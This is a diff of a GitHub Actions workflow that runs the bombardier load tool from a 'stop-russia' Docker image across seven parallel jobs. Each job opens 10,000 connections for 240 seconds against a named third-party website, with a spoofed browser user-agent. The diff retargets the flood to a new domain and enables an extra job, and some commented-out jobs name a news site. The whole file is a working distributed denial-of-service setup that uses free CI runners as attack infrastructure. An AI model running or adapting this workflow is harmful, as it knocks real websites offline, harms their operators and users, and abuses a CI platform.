@@ -1,5 +1,6 @@
 # UA
-# "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
+# "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+#Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
 # clone version
 # 10 instances
 name: Run Docker Command
@@ -25,8 +26,8 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  export url="https://vulner.softnetsolutions.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+                  export url="https://www.fastly.com"
+                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   run-docker-command-2:
     runs-on: ubuntu-latest
@@ -40,8 +41,8 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://vulner.softnetsolutions.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+                  export url="https://www.fastly.com"
+                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   run-docker-command-3:
     runs-on: ubuntu-latest
@@ -55,8 +56,8 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://vulner.softnetsolutions.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+                  export url="https://www.fastly.com"
+                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
   run-docker-command-4:
     runs-on: ubuntu-latest
 
@@ -69,8 +70,8 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://vulner.softnetsolutions.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+                  export url="https://www.fastly.com"
+                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
   run-docker-command-5:
     runs-on: ubuntu-latest
 
@@ -83,8 +84,8 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://vulner.softnetsolutions.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+                  export url="https://www.fastly.com"
+                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   run-docker-command-6:
     runs-on: ubuntu-latest
@@ -98,23 +99,23 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://vulner.softnetsolutions.com.au"
-                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+                  export url="https://www.fastly.com"
+                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
-  # run-docker-command-7:
-  #   runs-on: ubuntu-latest
+  run-docker-command-7:
+    runs-on: ubuntu-latest
 
-  #   steps:
-  #     - name: Instance 7
-  #       uses: actions/checkout@v3
+    steps:
+      - name: Instance 7
+        uses: actions/checkout@v3
 
-  #     - name: Run Docker container inside the action docker
-  #       uses: addnab/docker-run-action@v3
-  #       with:
-  #           image: abagayev/stop-russia:latest
-  #           run: |
-  #                 export url="https://www.cnn.com"
-  #                 bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+      - name: Run Docker container inside the action docker
+        uses: addnab/docker-run-action@v3
+        with:
+            image: abagayev/stop-russia:latest
+            run: |
+                  export url="https://www.fastly.com"
+                  bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   # run-docker-command-8:
   #   runs-on: ubuntu-latest
@@ -129,7 +130,7 @@ jobs:
   #           image: abagayev/stop-russia:latest
   #           run: |
   #                 export url="https://www.cnn.com"
-  #                 bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+  #                 bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   # run-docker-command-9:
   #   runs-on: ubuntu-latest
@@ -144,7 +145,7 @@ jobs:
   #           image: abagayev/stop-russia:latest
   #           run: |
   #                 export url="https://www.cnn.com"
-  #                 bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+  #                 bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
 
   # run-docker-command-10:
   #   runs-on: ubuntu-latest
@@ -159,4 +160,4 @@ jobs:
   #           image: abagayev/stop-russia:latest
   #           run: |
   #                 export url="https://www.cnn.com"
-  #                 bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
+  #                 bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" $url
